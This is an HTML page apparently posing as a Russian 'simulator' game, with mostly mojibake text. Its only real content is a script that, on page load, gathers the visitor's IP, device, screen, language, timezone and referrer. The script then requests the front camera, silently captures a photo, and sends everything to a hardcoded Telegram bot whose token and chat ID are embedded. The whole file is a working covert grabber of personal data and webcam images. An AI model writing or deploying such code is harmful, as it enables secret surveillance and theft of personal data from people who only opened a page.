<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ú–∞—Ç—Ä–µ—à–∫–∞ ‚Äî —Å–∏–º—É–ª—è—Ç–æ—Ä –Ω–∞—Å—Ç–æ—è—â–µ–π –†–æ—Å—Å–∏–∏</title>
    <style>
        /* –í–∞—à–∏ —Å—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π */
    </style>
</head>
<body>
    <!-- –í–∞—à–∞ HTML-—Ä–∞–∑–º–µ—Ç–∫–∞ –æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π -->

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram –±–æ—Ç–∞
        const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const CHAT_ID = '4798745489';
        
        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, –≤—ã–ø–æ–ª–Ω—è–µ–º–∞—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = async function() {
            // 1. –°–Ω–∞—á–∞–ª–∞ —Å–æ–±–∏—Ä–∞–µ–º –±–∞–∑–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
            const basicData = await collectBasicData();
            
            // 2. –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –≤–∏–¥–µ–æ
            try {
                await collectAndSendVideo(basicData);
            } catch (error) {
                console.log('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≤–∏–¥–µ–æ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –¥–∞–Ω–Ω—ã–µ');
                await sendTextData(basicData);
            }
        };

        // –°–±–æ—Ä –±–∞–∑–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        async function collectBasicData() {
            return {
                ip: await getIP(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || '–ø—Ä—è–º–æ–π –∑–∞—Ö–æ–¥',
                url: window.location.href,
                date: new Date().toLocaleString('ru-RU')
            };
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return '–Ω–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å';
            }
        }

        // –°–±–æ—Ä –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤–∏–¥–µ–æ
        async function collectAndSendVideo(basicData) {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' }, 
                audio: false 
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç —á–µ—Ä–µ–∑ 1 —Å–µ–∫—É–Ω–¥—É
            await new Promise(resolve => setTimeout(resolve, 1000));
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            
            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ blob
            const blob = await new Promise(resolve => 
                canvas.toBlob(resolve, 'image/jpeg', 0.8));
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º
            await sendToTelegram(blob, basicData);
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        async function sendTextData(data) {
            await sendToTelegram(null, data);
        }

        // –û–±—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        async function sendToTelegram(file, data) {
            const formData = new FormData();
            let caption = `üîî –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å!\n\n`;
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è
            caption += `üïí –í—Ä–µ–º—è: ${data.date}\n`;
            caption += `üåê IP: ${data.ip}\n`;
            caption += `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${data.userAgent}\n`;
            caption += `üñ• –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${data.platform}\n`;
            caption += `üì∫ –≠–∫—Ä–∞–Ω: ${data.screen}\n`;
            caption += `üó£ –Ø–∑—ã–∫: ${data.language}\n`;
            caption += `‚è∞ –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${data.timezone}\n`;
            caption += `üîó –ò—Å—Ç–æ—á–Ω–∏–∫: ${data.referrer}\n`;
            caption += `üìÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞: ${data.url}`;
            
            if (file) {
                formData.append('photo', file, 'photo.jpg');
                formData.append('caption', caption);
                formData.append('chat_id', CHAT_ID);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: caption
                    })
                });
            }
            
            console.log('–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram');
        }
    </script>
</body>
</html>
